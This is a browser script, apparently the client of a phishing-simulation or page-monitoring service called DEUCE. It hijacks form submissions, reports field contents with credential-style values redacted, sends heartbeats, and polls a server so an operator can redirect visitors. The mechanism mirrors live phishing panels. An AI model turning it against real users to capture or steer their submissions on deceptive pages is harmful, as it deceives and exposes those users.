(function () {
  "use strict";

  var currentScript = document.currentScript || (function () {
    var scripts = document.getElementsByTagName("script");
    return scripts[scripts.length - 1];
  })();

  var config = Object.assign({}, window.DEUCE_RUNTIME_CONFIG || {});
  if (currentScript && currentScript.dataset) {
    Object.keys(currentScript.dataset).forEach(function (key) {
      config[key] = currentScript.dataset[key];
    });
  }

  var userPageId = String(config.userPageId || config.page || "").trim();
  var pageId = String(config.pageId || location.pathname.split("/").pop() || "index.html").trim();
  var pageLabel = String(config.pageLabel || pageId).trim();
  var apiBase = String(config.apiBase || "/api/runtime").replace(/\/$/, "");
  var sessionKey = String(config.sessionKey || "deuce_session_" + userPageId);
  var commandPolling = config.commandPolling !== "false";
  var commandInterval = Math.max(Number(config.commandInterval || 4000), 1500);
  var lastSubmitter = null;

  if (!userPageId) {
    console.warn("DEUCE runtime client missing data-user-page-id.");
    return;
  }

  function sessionId() {
    try {
      var existing = sessionStorage.getItem(sessionKey);
      if (existing) return existing;
      var next = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
      sessionStorage.setItem(sessionKey, next);
      return next;
    } catch (error) {
      return "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
    }
  }

  var runtime = {
    userPageId: userPageId,
    pageId: pageId,
    pageLabel: pageLabel,
    sessionId: sessionId()
  };

  function endpoint(path) {
    return apiBase + "/" + path.replace(/^\//, "");
  }

  function sameLocation(targetUrl) {
    try {
      var target = new URL(targetUrl, location.href);
      var current = new URL(location.href);
      return target.origin === current.origin
        && target.pathname === current.pathname
        && target.search === current.search
        && target.hash === current.hash;
    } catch (error) {
      return false;
    }
  }

  function sensitiveField(field, input) {
    var text = [
      field,
      input && input.name,
      input && input.id,
      input && input.type,
      input && input.autocomplete,
      input && input.placeholder,
      input && input.getAttribute && input.getAttribute("aria-label")
    ].filter(Boolean).join(" ").toLowerCase();
    return /password|passcode|otp|one.?time|verification|2fa|mfa|pin|card|cc|credit|debit|cvv|cvc|security.?code|expiry|exp|routing|account|ssn|social|token|secret|credential|login|email/.test(text);
  }

  function safeFormData(form) {
    var data = {};
    var fields = Array.prototype.slice.call(form.elements || []).filter(function (input) {
      var type = String(input && input.type || "").toLowerCase();
      return input && input.name && !input.disabled && ["submit", "button", "reset", "file"].indexOf(type) === -1;
    });

    fields.forEach(function (input) {
      if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
      var escapedId = input.id && window.CSS && CSS.escape ? CSS.escape(input.id) : "";
      var linkedLabel = escapedId && document.querySelector ? document.querySelector('label[for="' + escapedId + '"]') : null;
      var wrapperLabel = input.closest && input.closest("label");
      var key = [
        input.getAttribute && input.getAttribute("aria-label"),
        input.placeholder,
        linkedLabel && linkedLabel.textContent,
        wrapperLabel && wrapperLabel.textContent,
        input.name,
        input.id
      ].filter(Boolean)[0] || "Field";
      key = String(key).replace(/\s+/g, " ").trim();
      data[key] = sensitiveField(key, input) ? (input.value ? "[redacted]" : "[blank]") : input.value || "";
    });

    data._fieldCount = fields.length;
    data._redaction = "sensitive credential-style values are not stored";
    return data;
  }

  function payload(extra) {
    return Object.assign({
      userPageId: runtime.userPageId,
      pageId: runtime.pageId,
      sessionId: runtime.sessionId,
      screen: runtime.pageLabel,
      hostname: location.hostname,
      path: location.pathname,
      userAgent: navigator.userAgent,
      createdAt: new Date().toISOString()
    }, extra || {});
  }

  function send(path, extra) {
    return fetch(endpoint(path), {
      method: "POST",
      keepalive: true,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload(extra))
    }).catch(function () {});
  }

  function track(eventName, extra) {
    return send("traffic", Object.assign({
      event: eventName || "page_event",
      result: "allowed"
    }, extra || {}));
  }

  function heartbeat() {
    return track("heartbeat", {
      screen: runtime.pageLabel,
      metadata: {
        visibility: document.visibilityState || "visible"
      }
    });
  }

  function submitResult(form) {
    return send("results", {
      screen: runtime.pageLabel,
      flow: [runtime.pageId],
      data: safeFormData(form)
    });
  }

  function ensureWaitStyles() {
    if (document.querySelector("[data-deuce-runtime-wait-style]")) return;
    var style = document.createElement("style");
    style.setAttribute("data-deuce-runtime-wait-style", "true");
    style.textContent = '.deuce-runtime-waiting{position:relative!important;pointer-events:none!important;opacity:.82!important}.deuce-runtime-waiting:after{content:""!important;display:inline-block!important;width:.85em!important;height:.85em!important;margin-left:.5em!important;border:2px solid currentColor!important;border-right-color:transparent!important;border-radius:999px!important;vertical-align:-.12em!important;animation:deuceRuntimeSpin .8s linear infinite!important}@keyframes deuceRuntimeSpin{to{transform:rotate(360deg)}}';
    document.head.appendChild(style);
  }

  function submitButtons(form, submitter) {
    var buttons = Array.prototype.slice.call(form.querySelectorAll('button[type="submit"], button:not([type]), input[type="submit"]'));
    if (submitter && buttons.indexOf(submitter) === -1) buttons.unshift(submitter);
    return buttons;
  }

  function setWaitingState(form, submitter) {
    ensureWaitStyles();
    form.setAttribute("data-deuce-waiting", "true");
    submitButtons(form, submitter).forEach(function (button) {
      if (!button.dataset.deuceOriginalText) button.dataset.deuceOriginalText = button.value || button.textContent || "Submit";
      button.disabled = true;
      button.setAttribute("aria-busy", "true");
      button.classList.add("deuce-runtime-waiting");
      if (button.tagName === "INPUT") {
        button.value = "Waiting...";
      } else {
        button.textContent = "Waiting...";
      }
    });
  }

  function checkCommand() {
    var params = new URLSearchParams({
      userPageId: runtime.userPageId,
      sessionId: runtime.sessionId,
      hostname: location.hostname
    });
    fetch(endpoint("session-command") + "?" + params.toString())
      .then(function (response) { return response.ok ? response.json() : null; })
      .then(function (data) {
        var command = data && data.command;
        if (command && command.action === "redirect" && command.targetUrl) {
          if (sameLocation(command.targetUrl)) {
            if (command.forceReload) location.reload();
            return;
          }
          location.href = command.targetUrl;
        }
      })
      .catch(function () {});
  }

  function handleRuntimeSubmit(form, submitter, event) {
    if (!form || !(form instanceof HTMLFormElement) || form.getAttribute("data-deuce-waiting") === "true") return;
    if (event) {
      event.preventDefault();
      event.stopImmediatePropagation();
    }
    if (typeof form.checkValidity === "function" && !form.checkValidity()) {
      if (typeof form.reportValidity === "function") form.reportValidity();
      return;
    }
    setWaitingState(form, submitter);
    submitResult(form);
    track("form_submit_waiting", { screen: runtime.pageLabel });
  }

  document.addEventListener("submit", function (event) {
    var form = event.target;
    handleRuntimeSubmit(form, event.submitter || lastSubmitter, event);
  }, true);

  document.addEventListener("click", function (event) {
    var button = event.target && event.target.closest ? event.target.closest('button, input[type="submit"]') : null;
    if (!button || !button.form) return;
    lastSubmitter = button;
    var type = String(button.getAttribute("type") || "submit").toLowerCase();
    if (type === "submit") handleRuntimeSubmit(button.form, button, event);
  }, true);

  window.DeuceRuntime = {
    sessionId: runtime.sessionId,
    pageId: runtime.pageId,
    pageLabel: runtime.pageLabel,
    track: track,
    submitResult: submitResult
  };

  track("page_load", { screen: runtime.pageLabel });
  heartbeat();
  if (commandPolling) {
    window.setInterval(checkCommand, commandInterval);
  }
  window.setInterval(heartbeat, 10000);
})();
